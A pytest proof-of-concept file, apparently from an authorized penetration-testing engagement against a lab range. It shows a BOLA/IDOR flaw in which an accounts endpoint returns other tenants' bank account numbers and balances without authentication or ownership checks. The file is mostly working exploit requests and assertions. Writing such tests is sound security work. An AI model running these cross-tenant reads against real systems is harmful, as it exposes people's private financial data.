"""
Unauthenticated + cross-tenant object disclosure (BOLA/IDOR) PoC against the
AUTHORIZED live target (operator-owned range instance).

Every request goes through the shipped, scope-enforced client ``p1hunt_dyn.Client``
(the engagement chokepoint) — NO raw sockets — so the deterministic runner can
re-run this inside its jail. (The previous revision used raw ``urllib`` and the
runner rejected it as "outside the sandbox".)

HEADLINE FINDING
  GET /api/v1/accounts/{account_id} resolves the account record *solely* from the
  attacker-chosen UUID and serializes owner + BAN (bank account number) + balance:
    - with NO Authorization header            -> 200 + victim financials
    - with alice's bearer token reading bob's  -> 200 + bob's financials
  There is no ``owner == principal`` check and no authentication requirement, while
  the sibling /api/v1/me endpoint DOES enforce auth (401 unauth) — proving the gap
  is an endpoint-specific omission, not a globally-open server.

EXPECT = pass  (exploit-assertion style: each assertion encodes the ATTACK
                SUCCEEDING; the attack holds on the vulnerable target, so it PASSES.
                A patched server that enforces auth/ownership flips 200->401/403 and
                every attack assertion FAILS.)

Identities from the environment: P1HUNT_TOKEN_A=alice, P1HUNT_TOKEN_B=bob.
Non-destructive: read-only GETs, loopback host only, a few bytes of evidence.

Run: python3 -I -m pytest -q test_bola_idor.py -s
"""
import pytest

from p1hunt_dyn import Client

# Well-known tenant account UUIDs (constants; also published per-principal via /api/v1/me).
AID_ALICE = "550e8400-e29b-41d4-a716-446655440000"
AID_BOB = "6ba7b810-9dad-11d1-80b4-00c04fd430c8"


@pytest.fixture(scope="module")
def client():
    return Client()


def _acct(resp):
    assert resp.status == 200, f"expected 200, got {resp.status}: {resp.text[:200]}"
    body = resp.json()
    assert isinstance(body, dict), f"non-JSON/object body: {resp.text[:200]}"
    return body


def test_me_enforces_auth_control(client):
    """CONTROL: /api/v1/me DOES require auth (401 without a token).

    Establishes the server CAN reject unauthenticated reads, so the accounts gap is
    an endpoint-specific omission and not a universally-open server.
    """
    r = client.get("/api/v1/me")  # no identity -> no bearer
    assert r.status == 401, f"expected 401 from unauth /me, got {r.status}: {r.text[:200]}"
    print("CONTROL /me unauth ->", r.status, r.text[:120])


def test_unauth_cross_tenant_account_financials(client):
    """ATTACK: credential-less attacker reads BOB's BAN + balance (no bearer sent)."""
    body = _acct(client.get(f"/api/v1/accounts/{AID_BOB}"))
    assert body.get("owner") == "bob", f"owner mismatch: {body}"
    assert body.get("ban") == "9985678", f"BAN mismatch: {body}"
    assert body.get("balance") == "88.00", f"balance mismatch: {body}"
    print("UNAUTH reads bob financials ->", body)


def test_alice_token_reads_bob_account_horizontal_bola(client):
    """ATTACK: principal alice (valid but unrelated session) reads BOB's account.

    Horizontal BOLA: ownership is never checked against the bearer principal.
    """
    body = _acct(client.get(f"/api/v1/accounts/{AID_BOB}", identity="a"))  # a = alice
    assert body.get("owner") == "bob", f"body: {body}"
    assert body.get("ban") == "9985678" and body.get("balance") == "88.00", f"body: {body}"
    print("alice token reads bob financials ->", body)


def test_unauth_reads_alice_account_financials(client):
    """ATTACK: the same credential-less read discloses ALICE's financials too,
    showing the disclosure is cross-tenant and general, not a single fixture."""
    body = _acct(client.get(f"/api/v1/accounts/{AID_ALICE}"))  # no bearer
    assert body.get("owner") == "alice", f"body: {body}"
    assert body.get("ban") == "9981234" and body.get("balance") == "412.19", f"body: {body}"
    print("UNAUTH reads alice financials ->", body)


def test_account_ids_are_leaked_per_principal_via_me(client):
    """SUPPORTING: /api/v1/me hands each authenticated principal its own account_id,
    confirming the UUID needed to pivot is a disclosed, not-secret identifier."""
    r = client.get("/api/v1/me", identity="a")
    body = _acct(r)
    assert body.get("account_id") == AID_ALICE, f"body: {body}"
    print("alice /me leaks account_id ->", body)
